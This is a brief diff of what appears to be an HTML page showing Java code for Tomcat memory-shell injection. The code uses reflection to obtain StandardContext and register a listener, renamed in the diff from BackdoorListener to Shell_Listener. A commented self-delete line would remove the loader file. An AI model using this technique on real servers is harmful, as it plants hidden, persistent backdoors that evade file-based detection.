@@ -73,7 +73,11 @@
         field = applicationContext.getClass().getDeclaredField("context");<br>
         field.setAccessible(true);<br>
         StandardContext standardContext = (StandardContext) field.get(applicationContext);<br>
-        standardContext.addApplicationEventListener(new BackdoorListener());<br>
+
+        <br>
+        standardContext.addApplicationEventListener(new Shell_Listener());<br>
+
+        <br>
         // 自毁    // (new File(application.getRealPath(request.getServletPath()))).delete();<br>
     </p>
 </body>
